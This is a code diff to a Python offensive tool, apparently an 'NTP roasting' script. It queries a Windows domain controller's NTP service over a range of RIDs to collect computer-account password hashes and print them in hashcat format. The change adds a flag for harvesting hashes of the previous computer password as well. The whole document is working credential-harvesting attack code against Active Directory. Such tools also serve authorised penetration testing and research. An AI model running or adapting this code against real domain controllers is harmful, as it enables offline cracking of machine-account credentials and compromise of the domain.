@@ -22,7 +22,7 @@ def hashcat_format(rid : int, hashval : bytes, salt : bytes) -> str:
   return f'{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}'
 
 
-def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -> List[Tuple[int, bytes, bytes]]:
+def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, old_pwd : bool) -> List[Tuple[int, bytes, bytes]]:
   """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
      Rate is the number of queries per second to send.
      Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will 
@@ -30,6 +30,9 @@ def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -
      issues.
      
      Yields (rid, hash, salt) pairs, where salt is the NTP response data."""
+
+  # Flag in key identifier that indicates whether the old or new password should be used.
+  keyflag = 2**31 if old_pwd else 0
 
   # Bind UDP socket.
   with socket(AF_INET, SOCK_DGRAM) as sock:
@@ -48,7 +51,7 @@ def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -
       # Send out query for the next RID, if any.
       query_rid = next(rid_iterator, None)
       if query_rid is not None:
-        query = NTP_PREFIX + pack('<I', query_rid) + b'\x00' * 16
+        query = NTP_PREFIX + pack('<I', query_rid ^ keyflag) + b'\x00' * 16
         sock.sendto(query, (dc_host, 123))
 
       # Wait for either a response or time to send the next query.
@@ -59,7 +62,7 @@ def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -
         # Extract RID, hash and "salt" if succesful.
         if len(reply) == 68:
           salt = reply[:48]
-          answer_rid = unpack('<I', reply[-20:-16])[0]
+          answer_rid = unpack('<I', reply[-20:-16])[0] ^ keyflag
           md5hash = reply[-16:]
 
           # Filter out duplicates.
@@ -128,6 +131,10 @@ listen privileges) is needed.
     help=f'Quit after not receiving NTP responses for TIMEOUT seconds, possibly indicating that RID space has ' +\
          f'been exhausted. Default: {DEFAULT_GIVEUP_TIME}.'
   )
+  argparser.add_argument(
+    '-l', '--old-hashes', action='store_true',
+    help=f'Obtain hashes of the previous computer password instead of the current one.'
+  )
 
   # Required arguments.
   argparser.add_argument(
@@ -143,7 +150,7 @@ def main():
   
   args = get_args()
   output = args.out
-  for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout):
+  for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout, args.old_hashes):
     print(hashcat_format(rid, hashval, salt), file=output)
   
 
